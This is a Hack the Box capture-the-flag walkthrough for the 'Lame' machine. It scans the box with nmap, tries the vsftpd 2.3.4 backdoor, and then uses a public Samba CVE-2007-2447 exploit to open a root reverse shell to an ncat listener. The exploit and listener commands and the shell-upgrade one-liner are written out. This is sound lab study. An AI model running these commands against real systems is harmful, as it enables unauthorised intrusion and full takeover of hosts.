Title: Lame - Hack the Box
Date: 2020-02-13
Modified: 2020-02-13
Category: ctf
Tags: ctf, hack the box, oscp prep
Slug: htb-lame
Authors: Riley
Summary: Guide to Lame on Hack the Box.

## Description

Lame is one of the easiest boxes overall, with a Samba SMB server exploit to instant root and a red herring.

Lame is assigned IP 10.10.10.3.

## Reconnaissance

We begin by initiating an Nmap scan.

#### Nmap
```bash
# nmap -sV -sC -oA nmap/Lame 10.10.10.3

Nmap scan report for 10.10.10.3
Host is up (0.085s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## VSFTP, The Red Herring

The first item to jump out is the `vsftpd 2.3.4` server.  This version of the software has a well known backdoor, [EDB-ID 17941](https://www.exploit-db.com/exploits/17491).  I located a public PoC, published by In2econd on [GitHub](https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py).

The exploit triggers the backdoor, which waits on port 6200 for commands.

#### vsftpd_234_exploit.py
`python3 ./vsftpd_234_exploit.py 10.10.10.3 21 whoami`
![Exploit failed on connection to backdoor](images\ctf\htb\lame\vsftpd_exploit_failed.png)

As you can see, the exploit did execute, but we could not connect to the backdoor port.  Either the software was patched, or there is a firewall blocking connections to miscellaneous ports.  Nmap reports that the port is filtered, so my guess is the latter.

![Filtered port means filtered progress](images\ctf\htb\lame\vsftpd_verify_backdoor_state.png)

## Investigating Samba

Since vsftp isn't an option, the remaining attack paths are either SSH or the Samba server.  Cursory research indicates that this version of OpenSSH doesn't have any significant exploits, and Nmap unfortunately failed to identify the exact version of Samba currently running.  Other utilities such as enum4linux also fail to identify the service sersion.

Metasploit has a module for this, `auxiliary/scanner/smb/smb_version`, that appearently does have some success in identifying the service.  I can also locate the version in a packet dump when using various utilities such as smbmap.  The commands I used are listed below.

msfconsole:	`msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.3; exploit; exit'`

tcpdump:	`tcpdump -nn -s0 -X -i tun0 host 10.10.10.3 && port 445`

![Finally a service version!](images\ctf\htb\lame\smb_identifying_version.png)

Unix Samba 3.0.20-Debian has a Remote Code Execution vulnerability assigned [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) that allows arbitrary execution of commands in the username field.

Github user _amiriunix_ made a [great Python PoC](https://github.com/amriunix/CVE-2007-2447) for this vulnerability.  After downloading, one should only need to install the python2 module `pysmb` to make it functional.  This should be as simple as `sudo pip2 install pysmb`.

The instructions on the command is executed as such as thi:

```md
## Usage:

shell
$ python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

  * `RHOST` -- The target address
  * `RPORT` -- The target port (TCP : 139)
  * `LHOST` -- The listen address
  * `LPORT` -- The listen port
```

After executing, it should create a reverse shell back to our machine.  First, we create a listener using Ncat (or something similar):

```bash
# rlwrap ncat -nvlp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
```
  
The command then should look like this:

```bash
# python ./usermap_script.py 10.10.10.3 139 10.10.14.33 8080
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

Back in our Ncat terminal:

```bash
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:37042.
whoami && hostname
root
lame
```

Excellent!  A root level reverse shell.  From this point, we can upgrade to a terminal with Python (this trick and more are discussed [here](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)) and locate the 2 flags.

```bash
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# ls /home
ls /home
ftp  makis  service  user
root@lame:/# ls -l /home/*/user.txt
ls -l /home/*/user.txt
-rw-r--r-- 1 makis makis 33 Mar 14  2017 /home/makis/user.txt
```

This concludes the Lame walkthrough.  Thanks for reading!
